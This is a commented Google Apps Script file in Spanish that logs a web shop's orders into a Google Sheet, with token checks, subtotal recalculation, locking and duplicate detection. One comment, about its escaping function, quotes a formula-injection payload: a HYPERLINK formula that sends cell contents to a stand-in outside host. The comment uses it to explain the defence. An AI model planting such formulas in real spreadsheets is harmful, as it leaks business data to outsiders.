/**
 * SONORO — Registro de pedidos
 *
 * Recibe los pedidos generados por el sitio y escribe una fila por pedido.
 *
 * Este archivo NO se ejecuta desde el repositorio: es la copia versionada de
 * lo que está pegado en el editor de Apps Script de la hoja «SONORO —
 * Pedidos». Si se edita allá, hay que traer el cambio acá, y al revés.
 *
 * INSTALACIÓN
 *   1. Hoja nueva en Google Sheets: «SONORO — Pedidos»
 *   2. Extensiones → Apps Script. Borra el contenido y pega este archivo.
 *   3. Ejecuta la función `configurar` UNA VEZ (menú desplegable → configurar → ▶).
 *      Autoriza los permisos que pida. Copia el token que imprime en el registro.
 *   4. Implementar → Nueva implementación → tipo «Aplicación web»
 *        Ejecutar como: Yo
 *        Quién tiene acceso: Cualquier persona
 *   5. Copia la URL y guárdala junto con el token en .env.local:
 *        QUOTE_LOG_URL=https://script.google.com/macros/s/.../exec
 *        QUOTE_LOG_TOKEN=<el token del paso 3>
 *
 * IMPORTANTE
 *   Cada vez que edites este archivo debes volver a implementar
 *   (Implementar → Administrar implementaciones → editar → Versión: Nueva).
 *   Guardar no basta: la URL sigue sirviendo la versión anterior.
 */

const HOJA = 'PEDIDOS';
const ZONA = 'America/Guatemala';

const ENCABEZADOS = [
  'Fecha',
  'Ref',
  'Unidades',
  'Subtotal (Q)',
  'Productos',
  'SKUs',
  'Origen',
];

/**
 * Columnas que llevan texto venido del cliente. Se formatean como TEXTO para
 * que la hoja no interprete nada de lo que llegue — ver `sanear`.
 * Fecha (1) y los números (3, 4) quedan fuera a propósito: se quieren como
 * fecha y como número, para ordenar y sumar.
 */
const COLUMNAS_DE_TEXTO = [2, 5, 6, 7];

/**
 * Ejecutar una sola vez, a mano, desde el editor.
 * Genera el token compartido y prepara la hoja.
 */
function configurar() {
  const props = PropertiesService.getScriptProperties();
  let token = props.getProperty('QUOTE_LOG_TOKEN');

  if (!token) {
    token = Utilities.getUuid().replace(/-/g, '');
    props.setProperty('QUOTE_LOG_TOKEN', token);
  }

  obtenerHoja();

  Logger.log('QUOTE_LOG_TOKEN=' + token);
  Logger.log('Copia esa línea a tu .env.local y a las variables de entorno de Vercel.');
}

function obtenerHoja() {
  const libro = SpreadsheetApp.getActiveSpreadsheet();
  let hoja = libro.getSheetByName(HOJA);

  if (!hoja) {
    hoja = libro.insertSheet(HOJA);
  }

  if (hoja.getLastRow() === 0) {
    hoja.appendRow(ENCABEZADOS);
    const cabecera = hoja.getRange(1, 1, 1, ENCABEZADOS.length);
    cabecera.setFontWeight('bold');
    cabecera.setBackground('#0B0B0C');
    cabecera.setFontColor('#FFFFFF');
    hoja.setFrozenRows(1);
    hoja.setColumnWidth(1, 150); // Fecha
    hoja.setColumnWidth(2, 110); // Ref
    hoja.setColumnWidth(5, 380); // Productos
    hoja.setColumnWidth(6, 200); // SKUs
    hoja.setColumnWidth(7, 240); // Origen
    hoja.getRange('D:D').setNumberFormat('#,##0.00');
  }

  // En cada llamada, no solo al crear la hoja: si alguien cambia el formato de
  // una de estas columnas a mano, la siguiente escritura lo repone. Es barato
  // y es la mitad de la defensa contra fórmulas (la otra mitad es `sanear`).
  for (let i = 0; i < COLUMNAS_DE_TEXTO.length; i++) {
    const letra = String.fromCharCode(64 + COLUMNAS_DE_TEXTO[i]);
    hoja.getRange(letra + '2:' + letra).setNumberFormat('@');
  }

  return hoja;
}

/**
 * Deja un valor como TEXTO PLANO, listo para una celda.
 *
 * En una hoja de cálculo, un valor que empieza con `=`, `+`, `-` o `@` no es
 * texto: se ejecuta. Y hay dos campos de esta fila que los controla por
 * completo quien manda la petición — `ref` y el navegador, que va a la
 * columna Origen. Un `=HYPERLINK("https://sitio-ajeno/?d="&A2,"ver")` ahí
 * convierte la hoja en un canal para sacar datos hacia afuera, y basta con
 * que alguien de la casa haga clic.
 *
 * El apóstrofo delante NO se ve en la celda: le dice a la hoja «esto es
 * texto». Va además del formato `@` de la columna, porque los dos fallan de
 * maneras distintas: el formato se puede cambiar a mano desde la hoja, y el
 * apóstrofo se pierde si alguien copia la celda y la pega como valor.
 */
function sanear(valor, maximo) {
  const texto = String(valor == null ? '' : valor).slice(0, maximo || 200);
  return /^[=+\-@\t\r]/.test(texto) ? "'" + texto : texto;
}

/** ¿Este pedido ya está en la hoja? Se compara contra la columna Ref. */
function refYaRegistrado(hoja, ref) {
  const ultima = hoja.getLastRow();
  if (ultima < 2) return false;

  const refs = hoja.getRange(2, 2, ultima - 1, 1).getValues();
  for (let i = 0; i < refs.length; i++) {
    // El apóstrofo de `sanear` no viaja en el valor leído, así que comparar
    // en crudo alcanza.
    if (String(refs[i][0]).trim() === ref) return true;
  }
  return false;
}

function respuesta(ok, mensaje, extra) {
  const cuerpo = Object.assign({ ok: ok, mensaje: mensaje }, extra || {});
  return ContentService
    .createTextOutput(JSON.stringify(cuerpo))
    .setMimeType(ContentService.MimeType.JSON);
}

function doPost(e) {
  try {
    if (!e || !e.postData || !e.postData.contents) {
      return respuesta(false, 'Cuerpo vacío');
    }

    let datos;
    try {
      datos = JSON.parse(e.postData.contents);
    } catch (err) {
      return respuesta(false, 'JSON inválido');
    }

    // Token compartido. Sin esto, cualquiera que descubra la URL puede
    // escribir filas en la hoja.
    const esperado = PropertiesService.getScriptProperties().getProperty('QUOTE_LOG_TOKEN');
    if (!esperado) {
      return respuesta(false, 'Script sin configurar: ejecuta configurar() una vez');
    }
    if (datos.token !== esperado) {
      return respuesta(false, 'No autorizado');
    }

    const ref = String(datos.ref || '').slice(0, 40);
    if (!ref) {
      return respuesta(false, 'Falta ref');
    }

    const items = Array.isArray(datos.items) ? datos.items : [];
    if (items.length === 0) {
      return respuesta(false, 'Pedido sin líneas');
    }

    // Fecha: se usa la del servidor, no la que manda el cliente.
    // El reloj del navegador no es una fuente de verdad.
    const fecha = Utilities.formatDate(new Date(), ZONA, 'yyyy-MM-dd HH:mm:ss');

    let unidades = 0;
    const lineas = [];
    const skus = [];

    for (let i = 0; i < items.length; i++) {
      const it = items[i] || {};
      const sku = String(it.sku || '?').slice(0, 40);
      const nombre = String(it.nombre || '').slice(0, 120);
      const qty = Number(it.qty) || 0;
      const cents = Number(it.unitPriceCents) || 0;

      unidades += qty;
      skus.push(sku);
      lineas.push(qty + 'x ' + sku + ' — ' + nombre + ' @ Q ' + (cents / 100).toFixed(2));
    }

    // El subtotal se RECALCULA aquí en vez de confiar en el que manda el
    // cliente. Si no coincide, se registra la discrepancia en Origen.
    let subtotalCents = 0;
    for (let i = 0; i < items.length; i++) {
      const it = items[i] || {};
      subtotalCents += (Number(it.qty) || 0) * (Number(it.unitPriceCents) || 0);
    }

    const enviado = Number(datos.subtotalCents);
    let origen = String(datos.userAgent || '').slice(0, 200);
    if (!isNaN(enviado) && enviado !== subtotalCents) {
      origen = '[subtotal recibido: ' + (enviado / 100).toFixed(2) + '] ' + origen;
    }

    const fila = [
      fecha,
      sanear(ref, 40),
      unidades,
      subtotalCents / 100,
      sanear(lineas.join('\n'), 2000),
      sanear(skus.join(', '), 400),
      sanear(origen, 240),
    ];

    // Dos pedidos simultáneos pueden escribir en la misma fila si no se
    // serializa el acceso. El candado cubre también la comprobación de
    // repetidos: sin él, dos reenvíos del mismo pedido podrían leer los dos
    // que «no está» y escribirlo dos veces.
    const lock = LockService.getScriptLock();
    try {
      lock.waitLock(10000);
      const hoja = obtenerHoja();
      // El reenvío puede llegar dos veces si la red reintenta, y un pedido
      // contado doble ensucia justo los números por los que existe la hoja.
      if (refYaRegistrado(hoja, ref)) {
        return respuesta(true, 'Repetido, no se escribió', { ref: ref });
      }
      hoja.appendRow(fila);
    } finally {
      lock.releaseLock();
    }

    return respuesta(true, 'Registrado', { ref: ref });
  } catch (err) {
    // Nunca lanzar: el sitio no debe recibir un 500 por un fallo de registro.
    return respuesta(false, 'Error interno: ' + err);
  }
}

/**
 * Verificación rápida desde el navegador: abre la URL de la implementación
 * y debe responder que el servicio está activo.
 */
function doGet() {
  return respuesta(true, 'Servicio de registro de pedidos activo');
}
